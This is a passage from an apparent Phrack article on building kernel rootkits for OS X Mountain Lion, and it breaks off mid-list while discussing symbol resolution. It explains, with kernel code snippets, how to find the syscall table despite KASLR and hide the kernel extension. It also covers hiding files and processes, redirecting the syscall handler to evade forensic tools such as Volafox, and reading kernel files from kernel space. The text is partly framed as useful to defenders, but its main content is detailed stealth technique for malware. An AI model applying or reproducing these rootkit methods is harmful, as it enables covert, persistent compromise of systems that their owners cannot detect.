--[ 1 - Introduction

In Phrack #66, ghalen and wowie wrote about interesting OS X kernel
rootkit techniques. That article is almost 4 years old and 4 major OS X
releases behind. Today Mountain Lion is king and many of the presented
techniques are not valid anymore - Apple reacted and closed those "holes".

One hand is enough to count the number of known rootkits targetting
Apple's OS. The most recent public release was Rubylin [2], a simple
rootkit that works with Lion (v10.7) (if you can read Korean there is
a very interesting memory forensics analysis at [3]).

The commercial spyware industry recently leaked DaVinci (aka OS.X/Crisis),
a user/kernel rootkit with some interesting features and flaws [4]. There
are rumours about FinFisher but no OS X leak happened yet. Everything
else is too old and outdated.

The main goal of this article is to update public knowledge and
introduce some "new" techniques so both offensive and defensive sides
can improve. It is focused on the current version at the time of this
writing, Mountain Lion, v10.8.2.

The defensive knowledge and available tools are still poor. I hope
this article motivates others to invest time and resources to improve
this scenario. It is quite certain that the offensive knowledge is
significantly ahead.

I tried to make this article as complete as possible but there is so
much to work to be done that it is a never-ending story. Some of the
proposed solutions can be improved or implemented in different and/or
better ways. You are encouraged to improve or develop new approaches
and of course publish them. I also like to learn from others ;-)

I hope you enjoy this (long) journey.
fG!


--[ 2 - The classic problems

This section starts by introducing important changes made since Tiger.
Then it discusses the old sysent retrieval techniques and their problems,
and presents a solution compatible with past, current, and future OS
X versions.

It continues with improvements to classic rootkit features - hide and
avoid (easy) detection. It must be noticed that these were developed
before the in-kernel symbol resolution technique to be presented later,
so they might appear a bit unsophisticated. I think there is value in this
knowledge and that is why it is described under the original conditions.


----[ 2.1 - What is new since Tiger

The easiest and many favourite's spot to hook the system calls is the
sysent table - just replace a pointer and we are set. Apple has been
improving the defence of that "castle" by hiding the sysent table symbol
and moving its location.

In Mountain Lion the table is now located in read-only memory (not a
big problem anyway). Syscall hijacking techniques like these can be
easily found with basic analysis tools, but they are still interesting
and useful for other purposes as to be shown later.

Another important change is that the kernel module list (kmod_info_t) is
deprecated. Before, the kernel extension rootkit could be easily hidden
from kextstat by manipulating this list. Now we must patch an I/O Kit
OSArray class called sLoadedKexts to hide from tools that list loaded
kernel extensions. Snare was the first to publicly discuss this issue,
and the commercial spyware OS.X/Crisis the first (afaik) to implement
it. Its technique will be later described.

Mountain Lion finally introduced kernel ASLR. It might be harder to
develop and execute the necessary exploit to install the rootkit but
after that it is (mostly) business as usual.

Up to Snow Leopard, Apple removed the symbol table from the kernel space
so there was no easy way to solve non-exported symbols inside the kernel
extension or I/O Kit driver. This was changed in Lion by leaving the full
__LINKEDIT segment in kernel memory but marked as pageable. Snare shows
this in one of his posts [5] and rubilyn rootkit uses it. Beware that
the formula they use has a small problem - it assumes that the symbol
table is located at the beginning of __LINKEDIT. This is true in Lion
but not in Mountain Lion.

I will show you how a solution that is stable, simple, and compatible
with all OS X versions. Too good to be true! :-)


----[ 2.2 - Sysent table discovery techniques

As described in Phrack 66 article, Landon Fuller [6] was first to come
public with a technique to solve the removal of exported sysent symbol.
His technique is based on the distance between the (still) exported
nsysent symbol (the number of entries in the sysent table, aka, number
of syscalls) and sysent. The problem with this approach is that Apple
can move the location of sysent between releases - offsets will change
and the rootkit will fail and expose itself. Not acceptable!

Lets illustrate this with an example, starting with Mountain Lion 10.8.2:

$ nm /mach_kernel | grep nsysent
ffffff8000839818 D _nsysent

The location of sysent can be found by disassembling the kernel and
using one of the three functions that reference it:

- unix_syscall
- unix_syscall64
- unix_syscall_return

For 10.8.2 the sysent pointer will be located at 0xFFFFFF80008000D0
and the table located at 0xFFFFFF8000855840. Landon's formula does not
apply here.

In Lion 10.7.5 we have:

$ nm mach_kernel_10_7_5 | grep nsysent
ffffff8000846ed8 D _nsysent
And sysent located at 0xFFFFFF8000842A40.

This confirms Apple moving around the pointer between different
releases. Notice that all previous values are from kernel at disk so no
kernel ASLR slide is included. The slide value will be disclosed whenever
it is being used in the examples.

Another technique is described in The Mac Hacker's Handbook [7], released
in 2009 and targeting Leopard.

On page 332 there is a code snippet that searches memory for "something
that has the same structure as the sysent table.". The starting search
point is the nsysent symbol, increasing the memory pointer to lookup
and match sysent array elements.

That code snippet does not work with Snow Leopard because sysent array
is located before nsysent symbol. It must be modified to support specific
versions and releases.

These different examples demonstrate that Apple changes sysent location
between releases. A stable rootkit requires an universal technique.

The second technique can be adapted to cover all cases. First we would
scan memory addresses above nsysent and then below if initial search
failed. If nsysent also stops being exported we would need to base the
search in another symbol and continue the cat & mouse game.

The reference symbol problem can be easily solved using a feature of
x86 systems, the interrupt descriptor table (IDT). The IDT "is used
by the processor to determine the correct response to interrupts and
exceptions." [8]. The traditional implementation of syscalls is done via
interrupt 80. The response to this interrupt will be executed by a kernel
function pointed to by the IDT. IDT's location can be obtained using the
asm instruction "sidt" (store interrupt descriptor table register). It
returns the table location so the next step is to find out the address
of the interrupt 80 handler.

Once we have the interrupt 80 handler address we can find out the
base address of the kernel. Kernel ASLR does not matter here because
the handler address is always a valid kernel code location - we are
dynamically querying the system and not using fixed addresses. To find
the kernel base address is just a matter of searching memory back for
the magic value of the Mach-O header - 0xfeedfacf (64 bits) or 0xfeedface
(32 bits).

One (curious) property of kernel ASLR implementation is that memory
addresses in kernel and kexts Mach-O headers already contain the ASLR
slide, something that does not happen in userland ASLR'ed binaries. The
header in userland binaries is never updated so it is not synced with
the address where the binary is loaded at.

The next step is to process the Mach-O headers and find out where the
__DATA segment is located. The reason for this is that the sysent table
is located in there - we need to extract segment's start address and
boundaries. Now it is just a matter of searching memory for something
that matches the sysent table.

Are there any performance problems doing things like this? The sysent
location is found in less than a second even on a 5 year old Core 2 Duo
Macbook Pro. The performance impact can be considered meaningless.

This method was applied successfully when the first Mountain Lion
developer preview became available and still works up to 10.8.2.

You can find its implementation in the included source code at the end.
A userland version that uses /dev/kmem to extract the same information
is available at [9].

What is the difference against using any other exported symbol instead
of all the trouble with the interrupt handler? Honestly, it is just a
matter of personal preference and technical "prowess". A symbol that
breaks compatibility if removed could be used instead with very low risk
of Apple changing it. Later, we will need to use at least one KPI so
almost any symbol from it can be used as search's starting point.

Another solution is to use one MSR register involved in the SYSCALL
instruction. A good candidate is the MSR register number 0xC0000082
(MSR_IA32_LSTAR), which contains the SYSCALL entrypoint.

One way to get its value in 64 bits is the following (ripped from XNU):

#define rdmsr(msr,lo,hi) \
__asm__ volatile("rdmsr" : "=a" (lo), "=d" (hi) : "c" (msr))

static inline uint64_t rdmsr64(uint32_t msr)
{
    uint32_t lo=0, hi=0;
    rdmsr(msr, lo, hi);
    return (((uint64_t)hi) << 32) | ((uint64_t)lo);
}

Calling rdmsr64(0xC0000082) will return the kernel address that will
handle 64 bits syscalls via the SYSCALL interface. The register number
0x176 (MSR_IA32_SYSENTER_EIP) is the one we are interested at for 32
bits systems - it is used for 32 bits syscalls via SYSENTER.

These are just a few possibilities to retrieve a valid address inside
the running kernel and then find the start address of the kernel Mach-O
header and sysent location. The location of the Mach-O header will be
useful to compute the kernel ASLR value (the slide is stored in a kernel
variable but its symbol is not exported!).


----[ 2.3 - Hiding the kext

As mentioned before, the kernel module list is deprecated in favor of a
IOKit OSArray class called sLoadedKexts. This introduces a new problem:
how to find its location since we are talking about IOKIT C++. The
OS.X/Crisis spyware implemented an interesting solution. It leverages
a simple IOKit method that references sLoadedKexts to find the object
location.

The method is OSKext::lookupKextWithLoadTag [libkern/c++/OSKext.cpp]:

OSKext * OSKext::lookupKextWithLoadTag(uint32_t aTag)
{
    OSKext * foundKext = NULL;  // returned
    uint32_t count, i;

    IORecursiveLockLock(sKextLock);

    count = sLoadedKexts->getCount(); <- use this location, for example
    for (i = 0; i < count; i++) {
        OSKext * thisKext = OSDynamicCast(OSKext,
            sLoadedKexts->getObject(i));
        if (thisKext->getLoadTag() == aTag) {
            foundKext = thisKext;
            foundKext->retain();
            goto finish;
        }
    }
finish:
    IORecursiveLockUnlock(sKextLock);
    return foundKext;
}

There is no symbol resolution feature inside the Crisis kernel rootkit
- the symbol (__ZN6OSKext21lookupKextWithLoadTagEj) is solved by the
userland component and sent to the rootkit module via a sysctl. The
function that hides the rootkit starts by searching for the 0xE8 byte
corresponding to the IORecursiveLockLock() call. All searches are done
using hex patterns. It then uses fixed offsets to compute the location
of the array and modify it. The provided source code reimplements
this technique.

The search could be made easier (and portable?) by disassembling this
method. The good news is that we can have a x86/x64 disassembler inside
a kernel extension thanks to diStorm [19] (other libraries probably
work but I'm a fan of diStorm, in particular after the introduction of
the decompose interface). To statically compile diStorm just import the
source and include files into your rootkit project. You also need to
define SUPPORT_64BIT_OFFSET or uncomment it at config.h.

Assuming we have no method to find kernel symbols inside the rootkit
(this will be later developed), we can use the disassembling engine
to try to find the functions or methods that we are interested in. The
whole __text section can be disassembled and searched for instruction
patterns that are hopefully more stable than hex patterns.

Testing this approach I was able to find the method referenced above with
a precision of 100% or 50%. The different rates depend on how strict are
the search parameters due to some differences between compiler output in
kernel versions. I'm talking about the number of calls, jmps, jnz, jae,
which have small variations between some versions (compiler upgrades,
settings, etc). The performance is amazing - it takes 1 second to
disassemble and search the whole kernel using a high-end Intel i7 cpu.

The main problem of Crisis's approach is that it depends on fixed offsets
inside the OSArray class. If anything changes it will break compatibility
and potentially crash or expose the rootkit.

Disassembling the kernel is useful to find patterns and leveraging them
in different cases. It is not perfect and does not solve all our problems
but it is another helpful tool.


----[ 2.4 - Hiding files

Files are hidden by modifying (at least) three different syscalls:
getdirentries, getdirentriesattr, and getdirentries64. Nothing new and
thoroughly described before.

What usually happens is that only the filename is matched - that is the
information directly available from the structures available in those
three syscalls. This means that a filename to be hidden will be matched
in any folder, something that can raise suspicion if a common filename
is used. With a small effort we can do better and learn something in
the process.

Let's find out how to recover additional information to match specific
file or folder locations. Target function is getdirentries64 but the
concepts apply to the other two.

The structure that is commonly manipulated is:

struct direntry {
  __uint64_t  d_ino;      /* file number of entry */
  __uint64_t  d_seekoff;  /* seek offset (optional, used by servers) */
  __uint16_t  d_reclen;   /* length of this record */
  __uint16_t  d_namlen;   /* length of string in d_name */
  __uint8_t   d_type;     /* file type, see below */
  char d_name[__DARWIN_MAXPATHLEN]; /*entry name (up to MAXPATHLEN bytes)*/
}

The match is done against the field d_name, which only contains the
current file or folder without the full path. This is the reason why
most implementations only match the file anywhere in the filesystem.

Luckily for us, all syscalls functions prototypes contain the proc
structure as the first parameter. It contains enough information to
match the full pathname.

struct proc {
(...)
    struct  filedesc *p_fd;        /* Ptr to open files structure. */
(...)
}

struct filedesc {
    struct  fileproc **fd_ofiles;   /* file structures for open files */
    char    *fd_ofileflags;         /* per-process open file flags */
    struct  vnode *fd_cdir;         /* current directory */
    struct  vnode *fd_rdir;         /* root directory */
    int     fd_nfiles;              /* number of open files allocated */
    int     fd_lastfile;            /* high-water mark of fd_ofiles */
    (...)
};

For example, to display all the open files by an arbitrary process
calling getdirentries64, we could use the following code:

void show_all_openfiles(struct proc *p)
{
    // lock proc structure else we are asking for trouble
    (*proc_fdlock)(p);
    struct filedesc *fd = p->p_fd;
    if (fd != NULL)
    {
        // for some reason fd_nfiles is not useful for this
        int lastfile = fd->fd_lastfile;
        // show all open files for this proc
        for (int count = 0; count < lastfile; count++)
        {
            // fd_ofiles is an array of fileproc that contains file structs
            // for all open files
            struct fileproc *fp = fd->fd_ofiles[count];
            // we are only interested in files so match fg_type field
            if (fp != NULL &&
                fp->f_fglob != NULL &&
                fp->f_fglob->fg_type == DTYPE_VNODE)
            {
                // lock the vnode - fg_data cast depends on fg_type
                // type is vnode so we know fg_data will point to a vnode_t
                (*vnode_lock)((struct vnode*)fp->f_fglob->fg_data);
                struct vnode *vn = (struct vnode*)fp->f_fglob->fg_data;
                if (vn->v_name != NULL)
                {
                    printf("[%d] Filename: %s\n", count, vn->v_name);
                }
                (*vnode_unlock)((struct vnode*)fp->f_fglob->fg_data);
            }
        }
    }
    (*proc_fdunlock)(p);
}

The files listed by this function are not the files we want to hide but
the files opened by the binary calling this syscall. This information
can be used, for example, to find the path that a "ls" command is trying
to list. The full path can be extracted manually by iterating over the
vnodes of each file, or by using a KPI function (vn_getpath).

To build the path from vnodes, first we retrieve the vnode structure
correspondent to the file and then iterate over up to the filesystem
root - each vnode has a reference to its parent vnode.

struct vnode {
(...)
    const char *v_name;      /* name component of the vnode */
    vnode_t v_parent;        /* pointer to parent vnode */
(...)
}

Each path component can be sequentially matched until v_parent == NULLVP,
which means the filesystem root. If path matches what we want to hide
then it is a matter of removing that entry from direntry array as usual.

To find the folder or file being listed we can use the following trick,
which seems to hold true:

int lastfile = main_fd->fd_lastfile;
// lastfile has the information we are looking for
struct fileproc *last_fp = main_fd->fd_ofiles[lastfile];

The only word of caution is when shell expansion is involved. In this case
last file entry name will be a "ttys" and we need to iterate fd_ofiles
array looking for the previous element to "ttys" - it is not lastfile-1.

It looks complicated but it is not and just a matter of looking up
the necessary information in kernel structures. The proc structure is
extremely rich and a good starting point for many hacks. The biggest
problem is being frequently changed between major OS X versions.

With so many kernel functions available it is almost certain there is
already a function that will avoid us to build the path as described
above. That function is vn_getpath() from bsd/sys/vnode.h.

/*!
 @function vn_getpath
 @abstract Construct the path to a vnode.
 @discussion Paths to vnodes are not always straightforward: a file with
multiple hard-links will have multiple pathnames, and it is sometimes
impossible to determine a vnode's full path. vn_getpath() will not enter
the filesystem.
 @param vp The vnode whose path to obtain.
 @param pathbuf Destination for pathname; should be of size MAXPATHLEN
 @param len Destination for length of resulting path string. Result will
include NULL-terminator in count--that is, "len"
 will be strlen(pathbuf) + 1.
 @return 0 for success or an error code.
 */
int vn_getpath(struct vnode *vp, char *pathbuf, int *len);

We still need to retrieve a vnode from the proc structure to use this
function. To find the vnode we can use the lastfile trick to find the
target path, retrieve its vnode and then use this function to get the
full path.

A better solution is to hide your data inside other data files that
can't be easily checksum'ed. Sqlite3 databases come to my mind [35].


----[ 2.5 - Hiding processes

The traditional way to hide processes is to remove them from the process
list maintained by the kernel. When an application requests the process
list, the rootkit intercepts and modifies the request. In this case,
only the results are modified and the underlying structures are still
intact. A rootkit detection tool can access those structures and compare
with the results.

Another possibility is to remove the processes from the process list. This
time a tool that is based on those structures information will not be
able to detect the inconsistency because there is none (regarding only
the proc list, because there is data in other structures that can be
used to signal inconsistencies).

Due to OS X design, things are a bit more fun (or complicated) because
the BSD layer runs on top of XNU layer. The basic process units are Mach
tasks and threads and there's a one-on-one mapping between BSD processes
and Mach tasks. The task is just a container and Mach threads are the
units that execute code. What matters for this case is that there is
an additional list where inconsistencies can be detected - the Mach
tasks list. Using an ascii version of nofate's diagram found at [3]:

 proc <-> proc  <-> proc  <-> ...
  ^         ^         ^              BSD
--|---------|---------|------------------
  v         v         v              Mach
tasks <-> tasks <-> tasks <-> ...

The version with a hidden process at the BSD layer:

 proc <------------> proc <-> ...
  ^         ^         ^              BSD
--|---------|---------|------------------
  v         v         v              Mach
tasks <-> tasks <-> tasks <-> ...

Each BSD process has reference to the Mach tasks list via a void pointer
and vice-versa. Transversing both lists can detect the inconsistency
described above and most certainly flag an installed rootkit (it is
possible to have a Mach task without a corresponding BSD process).

struct proc {
(...)
    void *task;     /* corresponding task (static) */
(...)
}

struct task {
(...)
    void *bsd_info; /* the corresponding proc_t */
(...)
}

The (not so new) lesson to extract from this is that there many points to
be used for detecting inconsistencies in the system. These are hard to
hide if the goal is to hide one or more rogue processes. A much better
solution is to piggyback into normal processes, where detection is a
bit harder - it can be a normal process with an extra thread running
for example. The piggyback solution will be used later to run userland
commands from the kernel.


----[ 2.6 - Modifying the syscall handler

A common technique to hide modifications to syscall table is to make a
copy and modify the syscall handler to point to this new one. Rootkit
detection utils that just verify the *legit* table are unable to detect
it. There's nothing new about this technique although I have never seen it
in use in OS X. It is a good opportunity to describe how to implement it.

The interrupt 0x80 is handled by the assembly function
idt64_unix_scall [osfmk/x86_64/idt64.s]. The IDT table definition
[osfmk/x86_64/idt_table.h] confirms this and can be runtime verified by
querying the IDT and extracting the address of int80 handler.

USER_TRAP_SPC(0x80,idt64_unix_scall)

Follow the idt64_unix_scall assembler code. The switch to C happens
when unix_syscall[64] function is called, both for interrupt 0x80 and
sysenter/systrap system calls. This code path opens many opportunities
to change pointers, or install trampolines and redirect code to rootkit's
implementation.

One such possibility is to change the table pointer inside
unix_syscall[64]. This is sample code from the 64 bits version:

(...)
    code = regs->rax & SYSCALL_NUMBER_MASK;
    DEBUG_KPRINT_SYSCALL_UNIX(
        "unix_syscall64: code=%d(%s) rip=%llx\n",
        code, syscallnames[code >= NUM_SYSENT ? 63 : code], regs->isf.rip);
    callp = (code >= NUM_SYSENT) ? &sysent[63] : &sysent[code];
    uargp = (void *)(&regs->rdi);
(...)
    AUDIT_SYSCALL_ENTER(code, p, uthread);
    error = (*(callp->sy_call))((void *) p, uargp, &(uthread->uu_rval[0]));
    AUDIT_SYSCALL_EXIT(code, p, uthread, error);
(...)

Disassembly output (here I renamed memory references in IDA since they
have no symbols associated):

loc_FFFFFF80005E169C:
4C 03 2D 2D EA 21 00            add     r13, cs:sysent
4C 3B 2D 26 EA 21 00            cmp     r13, cs:sysent
74 0B                           jz      short loc_FFFFFF80005E16B7

The sysent reference is to:

__DATA:__got:FFFFFF80008000D0 40 58 85 00 80 FF FF FF sysent   dq offset
sysent_table

To directly find the location of sysent in the __got section is very
easy. Find out the location of sysent table using one of the section 2
techniques (or some other) and then search the __got section for that
address (to find the location and boundaries of __got section we just
need to read kernel's Mach-O header).

The easiest way to redirect sysent is to modify that pointer to our
modified copy. A (memory) forensic tool that (only) searches for and
lookups the original sysent table will fail to detect this and the next
trick. For example, Volafox v0.8 is vulnerable. Volatility's Mac version
at the time of writing has yet no sysent plugin available.

Another way is to modify the code reference to __got section and instead
point it to somewhere else. This is very easy to implement with diStorm's
assistance.

Disassemble the unix_syscall[64] functions and lookup for references to
__got address. The instructions that need to be matched are ADD and CMP
(this assumption appears to hold always true). To calculate the RIP target
address, diStorm has a helper macro called INSTRUCTION_GET_RIP_TARGET().
If the RIP address matches the __got address the offset can be updated.
Calculate the offset to the address that contains the pointer to the
new table and update it at the instruction that referenced the old
__got pointer.

One last (important!) detail. RIP addressing uses a 32 bits offset,
which appears to be enough to reference the new sysent (dynamically or
statically allocated) in most cases. This might not always be true -
from my experience the distance is very near the signed int limit.

One way to make this safer is to put the pointer in kernel's memory
space. This can be alignment space, Mach-O header (for the lulz!), or
somewhere else (it is just a data pointer so no need for exec permission).


--[ 3 - Reading the filesystem from kernel land

Now let's get going with the fun stuff that opens the door to even
funnier stuff!

One of the annoying obstacles that Apple introduced against development
of rootkits is the lack of kernel's full __LINKEDIT segment up to Snow
Leopard. Useful symbols for rootkit development are also not exported. No
one said rootkit development was easy - fun but not always easy.

Possible solutions are to solve the symbols from userland, and pattern
search from the kext - this one easily susceptible to failure due to
changing patterns in kernel versions and compilers.

For example, OS.X/Crisis spyware adopts a mixed approach. Most symbols
are solved from the userland agent and communicated thru a character
device to the rootkit, but sLoadedKexts is solved with byte search -
starting point is still a symbol solved from userland.

The easiest solution to this problem is to read the kernel file
(/mach_kernel) from the rootkit and process the symbol table, as it is
done from userland. The extracted addresses need to be fixed with the
kernel ASLR slide but that is easily bypassed as described in section 2.2.

As far as I know no publicly known OS X rootkit ever implemented arbitrary
filesystem read, and probably very few to none in other platforms (TDSS
being the most famous in Windows). There is some kind of myth about the
difficulty of implementing this or something else that made rootkits
developers avoid it. I must confess I was influenced by that "myth"
and never bothered to give it a try before this article.

In practice the implementation is extremely easy! Sometimes you just
need to be in the right mood and give it a try.

Two methods will be shown, one very easy based on exported symbols (and
a copy of a very stable private extern kernel function), and another a
bit more complex that requires some unexported symbols. Both are based in
VFS - the obvious and easiest way to achieve our goal. Other functions
can be used so many variations are possible. That is left open for you
to explore, I still have a lot to write about in this paper :-)


----[ 3.1 - Real short overview of VFS

The Virtual-Filesystem Interface was introduced in 4.4BSD and first
implemented by Sun Microsystems. Before this innovation file entries
directly referenced filesystem inodes. This method does not scale well
if there's more than a filesystem type.

VFS is an additional extensible object-oriented layer that introduces
an abstraction of the underlying filesystem, making it easy to support
multiple filesystems. Instead of inodes there are vnodes. There is no
need to deal with the intricacies of multiple filesystems - we can use
the VFS related functions and let the kernel do the filesystem operations
"dirtywork".

The most interesting VFS related structures to our purposes are:
- struct filedesc: defined at bsd/sys/filedesc.h, represents the open files
in a process.
- struct fileproc: defined at bsd/sys/file_internal.h, represents each open
file.
- struct fileglob: defined at bsd/sys/file_internal.h, contains all the
information associated to a file, including vnode and supported filesystem
operations.
- struct vnode: defined at bsd/sys/vnode_internal.h.

Detailed references about the design and implementation can be found at
[20], [14] and [13].


----[ 3.2 - The easy way - Apple loves rootkit authors!

The first piece of information that we need is the vnode of the target
file we want to read. We already seen in section 2.4 that this information
is available in proc_t structure but we can follow an easier path!

One suitable function is vnode_lookup() (available in BSD KPI). It is
defined at bsd/vfs/vfs_subr.c in XNU source code, and well documented
at bsd/sys/vnode.h include:

/*!
 @function vnode_lookup
 @abstract Convert a path into a vnode.
 @discussion This routine is a thin wrapper around xnu-internal lookup
routines; if successful, it returns with an iocount held on the resulting
vnode which must be dropped with vnode_put().
 @param path Path to look up.
 @param flags VNODE_LOOKUP_NOFOLLOW: do not follow symbolic links.
              VNODE_LOOKUP_NOCROSSMOUNT: do not cross mount points.
 @return Results 0 for success or an error code.
 */
errno_t vnode_lookup(const char *, int, vnode_t *, vfs_context_t);

The arguments are the path for the target file, search flags, a vnode_t
pointer for output and the vfs context for the current thread (or kernel
context).

The vfs context can be obtained using the function vfs_context_current()
but it is only available in the Unsupported KPI - subject to whatever
Apple wants to do with it so not stable enough for our purposes. In
practice the vfs context is not a problem because Apple (or BSD's
original code) took good care of us. Let me show you why with kernel's
implementation of vnode_lookup():

errno_t
vnode_lookup(const char *path, int flags, vnode_t *vpp, vfs_context_t ctx)
{
    struct nameidata nd;
    int error;
    u_int32_t ndflags = 0;

    if (ctx == NULL) {      /* XXX technically an error */
        ctx = vfs_context_current(); // <- thank you! :-)
    }
(...)
}

Apple's love means that we just need a simple operation to retrieve
kernel's vnode:

#include <sys/vnode.h>
int error = 0;
vnode_t kernel_vnode = NULLVP;
error = vnode_lookup("/mach_kernel", 0, &kernel_vnode, NULL);

One important detail is that vnode_lookup() will increase the iocount on
the target vnode (in case you missed above note from vnode_lookup). We
must release it using vnode_put() when we do not need it anymore (after
reading or writing what we want). This function is also available in
the BSD KPI.

Having kernel's vnode information we can finally read its contents from
the rootkit. To do that we can use the VNOP_READ() function - documented
and declared at bsd/sys/vnode_if.h.

/*!
 @function VNOP_READ
 @abstract Call down to a filesystem to read file data.
 @discussion VNOP_READ() is where the hard work of of the read() system
call happens. The filesystem may use  the buffer cache, the cluster layer,
or an alternative method to get its data; uio routines will be used to see
that data is copied to the correct virtual address in the correct address
space and will update its uio argument to indicate how much data has been
moved.
 @param vp The vnode to read from.
 @param uio Description of request, including file offset, amount of data
requested, destination address for data, and whether that destination is in
kernel or user space.
 @param ctx Context against which to authenticate read request.
 @return 0 for success or a filesystem-specific error. VNOP_READ() can
return success even if less data was read than originally requested;
returning an error value should indicate that something actually went
wrong.
 */
extern errno_t VNOP_READ(vnode_t, struct uio *, int, vfs_context_t);

The last missing piece is an uio structure. To create that buffer we
can use three other functions: uio_create(), uio_createwithbuffer()
and uio_addiov().

Two are available in BSD KPIs - uio_create and uio_addiov. The other
one, uio_createwithbuffer is private extern and used by uio_create. We
can rip its implementation into our rootkit code from XNU source file
bsd/kern/kern_subr.c. It's simple and stable enough to make this possible
(never modified in all latest OS X versions).

Once again we can pass NULL to the ctx argument - the implementation takes
care of it for us as in vnode_lookup().

An example how to create the required structure to hold a 4kbytes page:

char data_buffer[PAGE_SIZE_64];
uio_t uio = NULL;
uio = uio_create(1, 0, UIO_SYSSPACE, UIO_READ);
error = uio_addiov(uio, CAST_USER_ADDR_T(data_buffer), PAGE_SIZE_64);

The same example using uio_createwithbuffer:

char data_buffer[PAGE_SIZE_64];
uio_t uio = NULL;
char uio_buf[UIO_SIZEOF(1)];
uio = uio_createwithbuffer(1, 0, UIO_SYSSPACE, UIO_READ, &uio_buf[0],
 sizeof(uio_buf));
error = uio_addiov(uio, CAST_USER_ADDR_T(data_buffer), PAGE_SIZE_64);

First create the uio buffer, and then add it else it can't be used.
The data buffer can be a statically allocated buffer (as above) or
dynamically allocated using _MALLOC() or other available kernel variant.

Having the uio buffer created the last step is to execute the read:

error = VNOP_READ(kernel_vode, uio, 0, NULL);

If successful, the buffer will contain the first page (4096 bytes) of
/mach_kernel OS X kernel read into data_buffer.

A good implementation reference of this process is the kernel function
dqfileopen() [bsd/vfs/vfs_quota.c].


----[ 3.3 - The more complex way

This second approach was in fact how I started to explore this problem
and before I learnt about vnode_lookup(). It is a good backup method
but the learning experience and some techniques used to obtain some
information are the interesting bits here.

Its biggest inconvenience is that it requires the unexported symbol
VNOP_LOOKUP(). This function requires diferent arguments but has the
same functionality as vnode_lookup() - to lookup the vnode of a file
or directory. Documentation can be found at bsd/sys/vnode_if.h.

/*!
 @function VNOP_LOOKUP
 @abstract Call down to a filesystem to look for a directory entry by name.
 @discussion VNOP_LOOKUP is the key pathway through which VFS asks a
filesystem to find a file. The vnode should be returned with an iocount to
be dropped by the caller. A VNOP_LOOKUP() calldown can come without a
preceding VNOP_OPEN().
 @param dvp Directory in which to look up file.
 @param vpp Destination for found vnode.
 @param cnp Structure describing filename to find, reason for lookup, and
various other data.
 @param ctx Context against which to authenticate lookup request.
 @return 0 for success or a filesystem-specific error.
 */
#ifdef XNU_KERNEL_PRIVATE
extern errno_t VNOP_LOOKUP(vnode_t, vnode_t *, struct componentname *,
vfs_context_t);
#endif /* XNU_KERNEL_PRIVATE */

The first argument is the vnode of the directory where the target file
is located. It is a kind of a chicken and egg problem because we do not
have that information - we want it! Do not fear, this information can
be extracted from somewhere else. As previously described, the proc
structure contains the field p_fd - pointer to open files structure
(struct filedesc).

The filedesc structure has two interesting fields for our purposes:

1) fd_ofiles - an array of file structures for open files.
2) fd_cdir   - vnode structure of current directory.

There is also fd_rdir, which is the vnode of root directory but from my
tests it is usually NULL.

The proc structure is a doubly-linked list - we can "walk" around it and
retrieve information of any process. In OS X, the kernel is just another
Mach task with PID 0 and a corresponding proc entry - before Leopard
we could access kernel task via task_for_pid(0), which allowed DKOM
(direct kernel object manipulation). The mach_kernel file is located at
the root directory /.

The proposed procedure is to traverse the proc structure and find pid 0
(field p_pid). When found, the field fd_cdir will contain what we need -
the vnode for the root directory.

Next problem: how to access the proc structure. There is a symbol called
allproc that contains a pointer to it but it is not exported anymore. We
need an alternative way! Two solutions: complicated and straightforward.

Recalling what was already described in section 2.4. Kernel's
implementation of syscall functions has a struct proc * as first
parameter. Using open() as example:

open(struct proc *p, struct open_args *uap, int *retval)

What we can do is to temporarily (or not) hijack a syscall via sysent
table and get a reference to any proc_t. Since it is a doubly-linked
list we can traverse it and find PID 0. When found we can extract the
vnode pointer for current directory and that is it.

The kernel does not keep /mach_kernel open so the field fd_ofiles is
not useful. Luckly for us the fd_cdir is populated with the information
we need - vnode of root directory /.

The kernel knowledgeable reader knows there is no need for all this
mess to retrieve a proc_t structure. There is a BSD KPI function that
solves the problem with a single call, proc_find(). Its prototype is:
proc_t proc_find(int pid)

Kernel is just another task with PID 0, so just execute proc_find(0)
and get the required structure pointer. This will increase the reference
count and must be released using proc_rele(). Very easy, right? :-)

Once again we need a vfs context and this time we need to supply it. While
researching I used a hardcoded function pointer to vfs_context_current()
but there is a better function that I found out while writing this
section. It is vfs_context_create(), available in BSD KPI.

/*!
 @function vfs_context_create
 @abstract Create a new vfs_context_t with appropriate references held.
 @discussion The context must be released with vfs_context_rele() when no
longer in use.
 @param ctx Context to copy, or NULL to use information from running
thread.
 @return The new context, or NULL in the event of failure.
 */
vfs_context_t vfs_context_create(vfs_context_t);

We can use this function to create a new context and pass it to
VNOP_LOOKUP(). The next step is to create a struct componentname
[bsd/sys/vnode.h].

struct componentname {
     // Arguments to lookup.
    uint32_t    cn_nameiop;     /* lookup operation */
    uint32_t    cn_flags;       /* flags (see below) */
    void        *cn_reserved1;  /* use vfs_context_t */
    void        *cn_reserved2;  /* use vfs_context_t */
    // Shared between lookup and commit routines.
    char        *cn_pnbuf;      /* pathname buffer */
    int         cn_pnlen;       /* length of allocated buffer */
    char        *cn_nameptr;    /* pointer to looked up name */
    int         cn_namelen;     /* length of looked up component */
    uint32_t    cn_hash;        /* hash value of looked up name */
    uint32_t    cn_consume;     /* chars to consume in lookup() */
};

A small example to lookup /mach_kernel:

 struct componentname cnp;
 char tmpname[] = "mach_kernel";
 bzero(&cnp, sizeof(cnp));

 cnp.cn_nameiop = LOOKUP;
 cnp.cn_flags = ISLASTCN;
 cnp.cn_reserved1 = vfs_context_create(NULL);
 cnp.cn_pnbuf = tmpname;
 cnp.cn_pnlen = sizeof(tmpname);
 cnp.cn_nameptr = cnp.cn_pnbuf;
 cnp.cn_namelen = (int)strlen(tmpname); // <- add NULL ?

Now we are ready to call VNOP_LOOKUP() and use the returned vnode
information to execute VNOP_READ() as in section 3.1 (do not forget to
create first the UIO buffer).

Last but not least, there is another function we can (ab)use to read files
- vn_rdwr(). It was this function that triggered my curiosity about this
process while reading about the execution flow of a Mach-O binary. The
parameters it requires can be retrieved or created with the techniques
above described or others you might come up with. Feel free to implement
it and discover alternative ways to read the files (there are more!).

Writing is not harder than reading. Just browse the source files mentioned
in this section and the functions you need will be obvious. You can
apply the techniques here described to fill the required parameters.


----[ 3.4 - Solving kernel symbols

Snare on his blog post [5] explains in detail how to solve the kernel
symbols. The only difference is that instead of reading directly from
kernel memory we have the information in temporary buffers with data
read from the filesystem.

The proposed workflow is:

1) Read the first page of /mach_kernel, which contains the Mach-O header.
2) Process the Mach-O header and retrieve the following information:
   - From __TEXT segment: vmaddr field (for ASLR slide computation).
